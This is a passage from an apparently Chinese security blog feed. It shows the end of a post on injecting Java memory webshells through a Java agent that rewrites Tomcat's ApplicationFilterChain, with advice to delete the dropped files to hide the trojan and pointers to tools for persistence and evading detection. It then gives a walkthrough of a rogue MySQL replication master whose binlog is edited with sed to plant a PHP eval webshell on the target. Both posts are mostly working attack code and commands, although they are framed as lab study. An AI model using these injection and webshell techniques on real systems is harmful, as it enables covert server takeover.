class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName)) &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里填前面恶意类字节码文件上传到目标服务器的位置，同agent.jar的方式</span></span><br><span class="line">                fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\output.bin&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((len = fis.read(buffer)) == -<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0  </span><br><span class="line">Can-Redefine-Classes: true  </span><br><span class="line">Can-Retransform-Classes: true  </span><br><span class="line">Agent-Class: com.example.AgentMain</span><br></pre></td></tr></table></figure><p>然后利用 <code>Maven.Lifecycle.package</code> 工具打为 <code>jar</code> 包。</p><p><img src="/imgs/1694519422539.png"></p><ol start="3"><li>将刚刚生成的 <code>output.bin</code> 和 <code>agent.jar</code> 上传到目标服务器。这里就是复制到我本地的 <code>D</code> 盘根目录。</li></ol><p><img src="/imgs/1694519629968.png"></p><ol start="4"><li>攻击方运行注入进程的代码。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException &#123;  </span><br><span class="line">        <span class="comment">// 获取正在运行 JVM 列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 遍历列表  </span></span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor descriptor : list) &#123;  </span><br><span class="line">            <span class="comment">// 根据进程名字获取进程ID, 并使用 loadAgent 注入进程</span></span><br><span class="line">            <span class="keyword">if</span> (descriptor.displayName().contains(<span class="string">&quot;catalina&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;开始注入&quot;</span>);</span><br><span class="line">                System.out.println(descriptor.displayName());</span><br><span class="line">                System.out.println(descriptor.id());</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(descriptor.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;D:\\agent-demo03-1.0-SNAPSHOT.jar&quot;</span>, <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就成功注入内存马了。</p><p><img src="/imgs/1694520005176.png"></p><p><img src="/imgs/1694519983245.png"></p><p><img src="/imgs/1694519937771.png"></p><ol start="6"><li>注入内存马后别忘了删掉 <code>agent.jar</code> 和 <code>output.bin</code> 来隐藏木马。</li></ol><h1 id="内存马在反序列化漏洞环境中的具体使用"><a href="#内存马在反序列化漏洞环境中的具体使用" class="headerlink" title="内存马在反序列化漏洞环境中的具体使用"></a>内存马在反序列化漏洞环境中的具体使用</h1><p>在反序列化中，一次只能打入一个类（不能同时打入内部类），因此上面的 <code>poc</code> 都需要修改一下，例如在动态注入 <code>servlet</code> 的时候，不能在代码里面 <code>new Servlet()&#123; xxx &#125;</code> ，因为这是一个内部类，就会报错 <code>No Class Define Found</code> 。因此我们需要直接让 <code>poc</code> 本身就是一个 <code>Servlet</code> 。<br>需要注意的是，由于我们在反序列化实例化 <code>poc</code> 的时候就会调用内存马的代码，而在这个代码中又实例化了本身，这会导致死循环。因此我们需要让 <code>poc</code> 多一个有参构造函数，在空参构造函数中注入内存马时，实例化 <code>Servlet</code> 的时候就不要走空参构造函数了。</p><p>具体结合反序列化注入内存马的代码我放在了 <code>github</code> 上面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/justdoit-cai/java_memshell</span><br></pre></td></tr></table></figure><h1 id="内存马的查杀"><a href="#内存马的查杀" class="headerlink" title="内存马的查杀"></a>内存马的查杀</h1><p>工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/4ra1n/shell-analyzer</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694770246768.png"></p><h1 id="内存马的持久化"><a href="#内存马的持久化" class="headerlink" title="内存马的持久化"></a>内存马的持久化</h1><p>参考 <code>https://github.com/threedr3am/ZhouYu</code> 项目实现了内存马的 <strong>持久化</strong> 和 <strong>反查杀</strong> 。</p><ol><li><p><code>ZhouYu</code> 带来新的 <code>webshell</code> 写入手法，通过 <code>javaagent</code> ，利用 <code>JVMTI</code> 机制，在回调时重写 <code>class</code> 类，插入 <code>webshell</code>，并通过阻止后续 <code>javaagent</code> 加载的方式，防止 <code>webshell</code> 被查杀。</p></li><li><p>修改的 <code>class</code> 类插入 <code>webshell</code> 后，通过持久化到 <code>jar</code> 进行 <code>class</code> 替换，达到 <code>webshell</code> 持久化，任你如何重启都无法甩掉。</p></li></ol><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># java内存马完整的介绍</span><br><span class="line">https://xz.aliyun.com/t/11003#toc-0</span><br><span class="line"># tomcat中的WebappClassLoaderBase.getResources()方法为什么被废弃了</span><br><span class="line">https://dato.chequeado.com/docs/changelog.html</span><br><span class="line"># 如何从ThreadLocal中获取StandardContext</span><br><span class="line">https://www.yuque.com/tianxiadamutou/zcfd4v/tzcdeb</span><br><span class="line"># 如何通过MBean获取StandardContext</span><br><span class="line">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</span><br><span class="line"># dispatcherType的解释1</span><br><span class="line">http://c.biancheng.net/servlet2/filter.html</span><br><span class="line"># dispatcherType的解释2</span><br><span class="line">http://blog.zollty.com/b/archive/the-filter-and-dispatcher-type-of-spring-or-servlet-3.html</span><br><span class="line"># Filter内存马实现1</span><br><span class="line">https://www.cnblogs.com/nice0e3/p/14622879.html#connector</span><br><span class="line"># Filter内存马实现2</span><br><span class="line">https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na#34bb9bc2</span><br><span class="line"># Listener的使用</span><br><span class="line">https://www.liaoxuefeng.com/wiki/1252599548343744/1304266123771937</span><br><span class="line"># 高版本（2.6及以后）的SpringBoot内存马实现</span><br><span class="line">https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/#SpringBoot2-6%E4%B9%8B%E5%90%8E%E7%9A%84%E6%94%B9%E5%8A%A8</span><br><span class="line"># 高版本SpringBoot的controller内存马和低版本不一样的原因</span><br><span class="line">https://9bie.org/index.php/archives/953/</span><br><span class="line"># 官网的说明</span><br><span class="line">https://spring.io/blog/2020/06/30/url-matching-with-pathpattern-in-spring-mvc</span><br><span class="line"># 比对调试法解决SpringBoot版本问题</span><br><span class="line">https://www.jianshu.com/p/4500b61384f8</span><br><span class="line"># github的版本更新说明</span><br><span class="line">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.6-Release-Notes</span><br><span class="line"># Java agent修改 doFilter https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/05.%E5%86%85%E5%AD%98%E9%A9%AC/03.java%20agent%20%E5%86%85%E5%AD%98%E9%A9%AC#java-agent%E4%BF%AE%E6%94%B9dofilter</span><br><span class="line"># 论如何优雅的注入Java Agent内存马</span><br><span class="line">https://www.cnblogs.com/rebeyond/p/16691104.html</span><br><span class="line"># Tomcat的Valve型内存马</span><br><span class="line">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</span><br><span class="line">https://www.anquanke.com/post/id/225870</span><br><span class="line"># 其它相关文章</span><br><span class="line">https://www.cnblogs.com/rebeyond/p/9686213.html</span><br><span class="line"># 内存马的查杀</span><br><span class="line">https://github.com/4ra1n/shell-analyzer</span><br><span class="line"># 内存马的持久化</span><br><span class="line">https://github.com/threedr3am/ZhouYu</span><br><span class="line"># 哥斯拉内存马</span><br><span class="line">https://github.com/BeichenDream/Godzilla/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL-构造恶意主从同步服务器</title>
      <link href="/2023/08/30/MySQL-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2023/08/30/MySQL-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>我们可以让我们靶机的数据库执行我们提交的任意的 <code>sql</code> 语句，但是靶机过滤了 <code>into</code> ，<code>outfile</code> ，<code>dumpfile</code> 关键字。这样我们即使拿下了数据库的权限，也无法进一步拿下服务器的权限。</p><p>这篇文章围绕通过 <strong>构造恶意的 <code>MySQL</code> 主从服务器</strong> ，来绕过 <code>sql</code> 语句的 <code>waf</code> （主要是过滤 <strong>上传文件</strong> 的关键字），从而通过数据库上传木马文件到服务器来进一步提权（这里假设靶机数据库的 <code>secure_file_priv</code> 是关闭的，靶机唯一的防线就是对 <code>sql</code> 语句的 <code>waf</code> ）。</p><h1 id="方式一：修改binlog文件"><a href="#方式一：修改binlog文件" class="headerlink" title="方式一：修改binlog文件"></a>方式一：修改binlog文件</h1><p>通过构造恶意的 <code>MySQL</code> 主从服务器，让靶机的 <code>MySQL</code> 同步我们攻击机 <code>MySQL</code> 执行的 <code>sql</code> 语句。这里通过修改 <code>binlog</code> 文件来实现同步恶意 <code>sql</code> 语句。</p><h2 id="利用实验"><a href="#利用实验" class="headerlink" title="利用实验"></a>利用实验</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>攻击机 <code>kali</code> 的 <code>IP</code> 为：<code>192.168.163.133</code><br>靶机 <code>ubuntu</code> 的 <code>IP</code> 为：<code>192.168.163.129</code></p><p>用 <code>Docker</code> 在两台机器上搭建 <code>MySQL</code> 环境。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id -p 3306:3306 --name=mysql_demo01 -e MYSQL_ROOT_PASSWORD=root mysql:8.0.27</span><br></pre></td></tr></table></figure><p>然后在两台机器上执行下面的命令来安装 <code>vim</code> 。参考 <a href="%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL/MySQL%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5.md">MySQL主从同步</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 467B942D3A79BD29</span><br><span class="line">apt-get update </span><br><span class="line">apt-get install vim -y</span><br></pre></td></tr></table></figure><p>然后将靶机的 <code>secure_file_priv</code> 参数修改为空，然后重启 <code>MySQL</code> 。</p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h4 id="配置攻击机成为主从同步的master节点"><a href="#配置攻击机成为主从同步的master节点" class="headerlink" title="配置攻击机成为主从同步的master节点"></a>配置攻击机成为主从同步的master节点</h4><p>配置攻击机，让其成为 <code>MySQL</code> 主从同步的 <code>master</code> 节点。</p><p>首先在 <code>MySQL</code> 的命令行执行下面的语句。</p><blockquote><p>注意：<br>由于 <code>MySQL-8.0</code> 以上的默认密码认证方式是 <code>caching_sha2_password</code> ，而非 <code>mysql_native_password</code> 。如果我们这里不指定 <code>slave</code> 用户的密码认证方式是 <code>mysql_native_password</code> ，之后 <code>slave</code> 节点就会认证用户失败。报错信息是：<code>error connecting to master &#39;slave_rep@192.168.163.133:3306&#39; - retry-time: 60 retries: 8 message: Authentication plugin &#39;caching_sha2_password&#39; reported error: Authentication requires secure connection.</code> （如果靶机的 <code>MySQL</code> 版本在 <code>8.0</code> 以下就没这个问题了）</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 创建slave_rep用户，密码是<span class="number">123456</span>，可以任意ip段连接，并且指定密码认证方式是mysql_native_password</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave_rep&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> <span class="string">&#x27;mysql_native_password&#x27;</span> <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;  </span><br><span class="line"># 对创建的用户赋予复制权限</span><br><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;slave_rep&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后修改攻击机 <code>MySQL</code> 的配置文件 <code>my.cnf</code> 。</p><blockquote><p>这里又需要注意：<br>这里不能指定 <code>server-id=1</code> ，因为我们无法控制靶机的配置文件，因此无法为靶机配置 <code>server-id</code> 属性。因此靶机的 <code>server-id</code> 就为默认值 <code>1</code> 。如果我们这里攻击机的 <code>server-id</code> 也设置为 <code>1</code> ，后面靶机 <code>slave</code> 节点也无法成功连接攻击机 <code>master</code> 节点。报错信息是：<code>Fatal error: The slave I/O thread stops because master and slave have equal MySQL server ids; these ids must be different for replication to work (or the --replicate-same-server-id option must be used on slave but this does not always make sense; please check the manual before using it).</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv=</span><br><span class="line">server-id=2</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog_checksum=NONE</span><br><span class="line">binlog_format=STATEMENT</span><br><span class="line">master_verify_checksum=OFF</span><br></pre></td></tr></table></figure><p>然后重启攻击机 <code>MySQL</code> 。</p><h4 id="写入exp到攻击机的binlog文件"><a href="#写入exp到攻击机的binlog文件" class="headerlink" title="写入exp到攻击机的binlog文件"></a>写入exp到攻击机的binlog文件</h4><p>在攻击机的 <code>MySQL</code> 上创建一个数据库，创建成功后 <code>binlog</code> 文件就会自动导入创建这个数据库的 <code>sql</code> 语句。</p><blockquote><p>需要注意的是：<br>这里 <code>sql</code> 语句的长度就决定了等下我们能写入的 <code>exp</code> 的长度，因为两个的长度需要相等才能绕过对 <code>binlog event</code> 正确性的检查。而数据库名称的长度是有限制的，因此我们最好尽量给 <code>sql</code> 语句多加一点参数，让其尽量长一点。从而让我们的 <code>exp</code> 也能够更长一些。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_520_ci;</span><br></pre></td></tr></table></figure><p>接着我们在攻击机的 <code>MySQL</code> 执行 <code>show master status</code> 命令来查看攻击机当前的 <code>binlog</code> 文件名。</p><p><img src="/imgs/1693321114279.png"></p><p>接着我们通过 <code>xxd</code> 命令查看一下的 <code>mysql-bin.000003</code> 文件来查看是否有上面我们刚刚执行的 <code>sql</code> 语句。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd mysql-bin.000003</span><br></pre></td></tr></table></figure><p>发现确实存在。</p><p><img src="/imgs/1693321162375.png"></p><p>通过 <code>mysqlbinlog</code> 命令也可以说明成功写入了 <code>sql</code> 语句到 <code>binlog</code> 文件中。</p><p><img src="/imgs/1693321221200.png"></p><p>然后我们使用 <code>sed</code> 命令来替换 <code>mysql-bin.000003</code> 文件中刚刚那个 <code>sql</code> 语句为 <code>exp</code> 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">s/表示替换,/g表示全局替换</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里示例上传一个一句话木马，注意控制一句话木马的长度，还有一句话木马的特殊字符需要在shell命令行中被转义</span></span><br><span class="line">sed -i &quot;s/create database if not exists zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci/select &#x27;&lt;?php eval(\$\_POST\[1\]);echo 123;?&gt;&#x27; into outfile &#x27;11111111111111111111111111111111111111111111111111111111111111111111111111111111.php&#x27;/g&quot; /var/lib/mysql/mysql-bin.000003</span><br></pre></td></tr></table></figure><p>然后通过 <code>mysqlbinlog</code> 命令来查看这个文件，发现已经成功写入 <code>select</code> 语句了。</p><p><img src="/imgs/1693321315744.png"></p><h4 id="配置靶机成为攻击机的slave"><a href="#配置靶机成为攻击机的slave" class="headerlink" title="配置靶机成为攻击机的slave"></a>配置靶机成为攻击机的slave</h4><p>执行下面的 <code>sql</code> ，让我们构造恶意 <code>MySQL</code> 服务器成为靶机的 <code>master</code> 节点。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change master <span class="keyword">to</span> master_host<span class="operator">=</span><span class="string">&#x27;192.168.163.133&#x27;</span>,master_user<span class="operator">=</span><span class="string">&#x27;slave_rep&#x27;</span>,master_password<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span>,master_port<span class="operator">=</span><span class="number">3306</span>,</span><br><span class="line">master_log_file<span class="operator">=</span><span class="string">&#x27;mysql-bin.000003&#x27;</span>, master_log_pos<span class="operator">=</span><span class="number">227</span>;</span><br><span class="line"><span class="keyword">start</span> slave;</span><br></pre></td></tr></table></figure><blockquote><p>这里 <code>master_log_file</code> 的值就是上面我们在 <code>master</code> 节点上写入了 <code>exp</code> 的 <code>binlog</code> 文件（ <code>mysql-bin.000003</code>）， <code>master_log_pos</code> 的值是上面我们写入 <code>exp</code> 的那个 <code>event</code> 块位置的开头字节号（ <code>at 227</code> ，而不是像我们正常配置主从同步集群的时候配置的是 <code>event</code> 块位置的结尾字节号，也就是 <code>end_log_pos</code> ，否则 <code>slave</code> 节点开始同步 <code>sql</code> 语句就会从 <code>exp</code> 的下一个 <code>event</code> 开始，而不会执行 <code>exp</code> 所在 <code>event</code> 的 <code>sql</code> 语句）。</p><p><code>PS</code> ：<br>我们设置的 <code>master_log_pos</code> 的值为多少，到时候 <code>slave</code> 节点连上 <code>master</code> 节点就会从哪个字节号开始执行 <code>sql</code> 语句。（ <code>master_log_pos</code> 的值必须是一个 <code>event</code> 块字节号的开头，不能在一个 <code>event</code> 块的中间。）</p></blockquote><p>然后就可以成功执行 <code>exp</code> 了。</p><blockquote><p>但是需要注意的是：<br>这里我示范写入的文件在 <code>原本数据库（zzzz.....）</code> 为名称的当前目录下（因为没有写绝对路径），因此其实上面如果一开始就在 <code>master</code> 节点上就先修改 <code>binlog</code> ，那么 <code>slave</code> 节点就无法同步创建 <code>zzzz....</code> 这个数据库，也就不会有 <code>zzzz....</code> 这个目录，我们在写入文件的时候就会报错找不到 <code>zzzz....</code> 这个目录。（我们虽然修改了 <code>sql</code> 语句，但是通过 <code>xxd</code> 命令查看 <code>binlog</code> 信息，会发现数据库的信息还是会存在，因此我猜测虽然我们篡改了 <code>binlog</code> 日志，让靶机不会同步创建原本应该创建的数据库，但是靶机还是会把上传的文件上传到这个应该原本创建的数据库的目录下）<br>因此其实这里应该先走正常的流程，不修改 <code>binlog</code> 文件，让 <code>slave</code> 节点创建了这个数据库。然后再修改 <code>binlog</code> 文件，再让 <code>slave</code> 节点同步操作。这样在写入木马的时候就不会报找不到目录的错误了。<br>但其实正常情况下，我们写入木马文件应该写绝对路径，因为当前路径的位置不好确定，不一定靶机的 <code>MySQL</code> 就存放在正常的位置。但是需要注意的是，<code>MySQL</code> 运行时的用户权限较低，写绝对路径的时候可能会存在权限不足，写入不了目录的情况。</p></blockquote><p><img src="/imgs/1693324317786.png"></p><p>之所以我发现了上面的问题，是因为我刚开始不知道为什么木马一直写入不进去。通过 <code>show slave status</code> 命令会发现报错 <code>Coordinator stopped because there were error(s) in the worker(s). The most recent failure being: Worker 1 failed executing transaction &#39;NOT_YET_DETERMINED&#39; at master log mysql-bin.000003, end_log_pos 563. See error log and/or performance_schema.replication_applier_status_by_worker table for more details about this failure or others, if any.</code> 。然后我们再通过报错信息查看 <code>performance_schema.replication_applier_status_by_worker</code> 表。发现 <code>MySQL</code> 有下面的报错信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Worker 1 failed executing transaction &#x27;NOT_YET_DETERMINED&#x27; at master log mysql-bin.000005, end_log_pos 903; Error &#x27;Can&#x27;t create/write to file &#x27;/var/lib/mysql/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/11111111x`111111111111111111111111111111111111111111111111111111111111111111111111.php&#x27; (OS errno 2 - No such file or directory)&#x27; on query. Default database: &#x27;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&#x27;. Query: &#x27;select &#x27;&lt;?php eval($_POST[1]);echo 123;?&gt;&#x27; into outfile &#x27;11111111111111111111111111111111111111111111111111111111111111111111111111111111.php&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>因此我才发现了写入木马之前还是需要正常先创建好应该创建的数据库，不然就会没有 <code>zzzz....</code> 这个数据库的信息目录。</p><h1 id="方式二：创建trigger-function-procedure"><a href="#方式二：创建trigger-function-procedure" class="headerlink" title="方式二：创建trigger&#x2F;function&#x2F;procedure"></a>方式二：创建trigger&#x2F;function&#x2F;procedure</h1><blockquote><p>冷知识：<code>trigger function procedure</code> ⾥可以存储 <code>select</code> 语句。</p></blockquote><p>主从同步创建 <code>trigger</code> 或 <code>function</code> 或 <code>procedure</code> ，通过主从同步同步到靶机，然后在靶机上执⾏即可。</p><h2 id="利用实验-1"><a href="#利用实验-1" class="headerlink" title="利用实验"></a>利用实验</h2><p>方式二的实验开头和方式一一样，都是先配置攻击机成为主从同步的 <code>master</code> 节点。</p><p>但是第二步不是写入 <code>exp</code> 到攻击机的 <code>binlog</code> 文件，而是和靶机同步创建 <code>trigger/function/procedure</code> ，写入 <code>exp</code> 到 <code>trigger/function/procedure</code> 中。</p><p>这里我们就不重复上面方式一搭建主从同步的配置了，直接开始写入 <code>exp</code> 到 <code>trigger/function/procedure</code> 这一步。</p><blockquote><p>当前环境：攻击机 <code>192.168.163.133</code> ，靶机 <code>192.168.163.129</code> ，并且两个机器的 <code>MySQL</code> 已经成功搭建好了主从同步。</p></blockquote><p>在攻击机执行下面的命令（任选一种），靶机会自动同步也执行下面的命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 